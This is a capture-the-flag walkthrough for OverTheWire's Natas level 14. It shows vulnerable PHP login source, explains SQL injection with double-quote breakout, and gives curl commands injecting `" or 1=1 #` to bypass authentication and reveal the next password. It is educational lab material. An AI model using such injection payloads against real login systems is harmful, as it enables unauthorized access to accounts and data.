> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas14.natas.labs.overthewire.org`                  |
| Username | `natas14`                                                    |
| Password | *found in [Natas Level 12 → 13](natas-level-12-level-13.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **`curl`** — to send crafted POST requests and use the debug parameter

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas14.natas.labs.overthewire.org` and log in with the password from Level 13.

The page presents a login form with two fields: **Username** and **Password**. Entering anything returns "Access denied!". Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
        echo "Successful login! The password for natas15 is <censored><br>";
    } else {
        echo "Access denied!<br>";
    }
    mysqli_close($link);
}
?>
```

Two things stand out immediately.

First, the query is built by directly concatenating user input into a SQL string with no **sanitization**:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

When you submit `alice` and `secret`, the server executes:

```sql
SELECT * from users where username="alice" and password="secret"
```

The double quotes delimiting the username and password values come from the PHP string. Nothing prevents your input from containing a `"` character, which would break out of that delimiter and let you append arbitrary SQL.

Second, there is a built-in debug mode:

```php
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
}
```

Adding `?debug` to the URL causes the server to print the fully assembled SQL query before executing it. This is invaluable: it lets you see exactly what SQL your input produces, so you can iterate on a payload without guessing.

The success condition is also explicit:

```php
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
```

The application does not check _who_ logged in. It only checks whether the query returned _any rows at all_. If you can craft a query that returns at least one row — any row — you pass the authentication check.

---

### Understand SQL Injection

**SQL injection** occurs when user-supplied input is concatenated into a SQL query without sanitisation. The database cannot distinguish between the SQL the developer intended and the SQL the attacker appended — both arrive as a single string and are parsed together.

The query template is:

```sql
SELECT * from users where username="<input>" and password="<input>"
```

The outer double quotes are PHP string delimiters in the source code. Inside the assembled query, they become the SQL delimiters wrapping your input values. If your input contains a `"`, it closes the intended delimiter early and lets you write raw SQL.

Consider the username input `" or 1=1 #`:

```sql
SELECT * from users where username="" or 1=1 #" and password="anything"
```

Breaking this down:

- `""` — closes the username value immediately (empty string)
- `or 1=1` — appends an always-true condition: one equals one is always true, so this matches every row in the table
- `#` — starts a MySQL comment, discarding everything that follows on the same line, including the password check entirely

The query now returns every row in the `users` table. `mysqli_num_rows()` returns a number greater than zero, and the application grants access.

The `#` character is the MySQL single-line comment marker. `--` (followed by a space) is the ANSI SQL equivalent and also works here. Both discard the remainder of the query, allowing you to neutralise the password check without needing to know any valid password.

---

### Step 3 — Verify with Debug Mode

Before injecting, use the debug parameter to confirm the query structure. Send a legitimate request with `?debug` appended:

```bash
curl -u natas14:<password> \
     "http://natas14.natas.labs.overthewire.org/index.php?debug" \
     --data "username=alice&password=secret"
```

Output:

```
Executing query: SELECT * from users where username="alice" and password="secret"
Access denied!
```

The query uses double quotes around both values. This confirms that `"` is the character needed to break out of the string delimiter, not `'` as is common in other SQL injection scenarios. Single quotes here would be treated as literal characters inside the double-quoted string and would not cause a syntax change.

---

### Step 4 — Inject the Payload

Submit the injection through curl. The username field carries the payload; the password field is irrelevant since it gets commented out:

```bash
curl -u natas14:<password> \
     "http://natas14.natas.labs.overthewire.org/index.php?debug" \
     --data 'username=" or 1=1 #&password=anything'
```

With debug enabled, the output shows the assembled query:

```
Executing query: SELECT * from users where username="" or 1=1 #" and password="anything"
Successful login! The password for natas15 is <password>
```

The `or 1=1` condition matches every row in the table. The `#` discards the password clause entirely. The row count is greater than zero, and the application prints the password for natas15.

Alternatively, submit directly through the browser form: enter `" or 1=1 #` in the username field and anything in the password field.

That is the password for [Natas Level 14 → 15](natas-level-14-level-15.md).

---

## Key Takeaways

- **String concatenation into SQL is the root cause of SQL injection.** The moment user input is embedded directly into a query string, with no escaping, no parameterisation, the attacker controls the SQL, not just the values. This is the same class of vulnerability as command injection in Levels 9 and 10, applied to a database instead of a shell.
- **`or 1=1` is a tautology.** It is always true, which means it matches every row in the table when used in a `WHERE` clause. Combined with a comment to discard the rest of the query, it bypasses any username/password check that works by counting returned rows rather than verifying a specific credential.
- **Know your quote character.** This level uses double quotes as SQL string delimiters, not single quotes. Injecting `'` would have no effect here — it would be treated as a literal character inside a double-quoted string. The debug parameter is exactly the tool to reveal this before you start guessing.
- **The debug parameter is a critical information leak.** Printing the assembled SQL query to the response in any production context is dangerous — it exposes the query structure, table names, and column names, all of which an attacker needs to craft more precise injections. It almost certainly exists here as a developer convenience that was never removed.

---
